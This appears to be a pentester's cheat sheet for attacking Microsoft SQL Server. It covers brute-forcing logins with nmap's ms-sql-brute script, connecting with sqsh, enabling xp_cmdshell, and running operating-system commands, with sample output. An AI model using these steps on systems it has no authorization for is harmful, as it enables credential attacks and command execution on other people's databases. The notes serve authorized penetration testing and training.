# MSSQL

## Broute Force Credentials

### <a href='https://nmap.org/nsedoc/scripts/ms-sql-brute.html' target="blank">File ms-sql-brute</a>

``` bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>
```

## Connection

### Add server

``` bash
$ cat /etc/freetds/freetds.conf
<snip>
[Pentest]
        host = <ip>
        port = 1433
```

### Connect with stored password

``` bash
$ cat ~/.sqshrc
\set username=sa
\set password=PASSWORD
\set style=vert
$ sqsh -S Pentest
1>
```

### Connect normal

``` bash
$ sqsh -S mssql -U sa
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
Password: 
1> \set style=vert
1>
```

## Execute commands

### Check Advanced Option

``` bash
1> EXEC sp_configure 'show advanced option';
2> go
name:         show advanced options
minimum:      0
maximum:      1
config_value: 0
run_value:    0
 
(return status = 0)
```

### Config xp_cmdshell if value =0

``` bash
1> EXEC sp_configure 'show advanced option', '1';
2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> RECONFIGURE WITH OVERRIDE;
2> go
1> EXEC sp_configure 'xp_cmdshell', 1;
2> go
Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> RECONFIGURE;
2> go
=== Recheck ===
1> EXEC sp_configure 'show advanced option';
2> go
name:         show advanced options
minimum:      0
maximum:      1
config_value: 1
run_value:    1
 
(return status = 0)
------
```

### Execute commands

``` bash
1> xp_cmdshell 'whoami';
2> go
output: nt service\mssql$sqlexpress

output: NULL

(2 rows affected, return status = 0)
```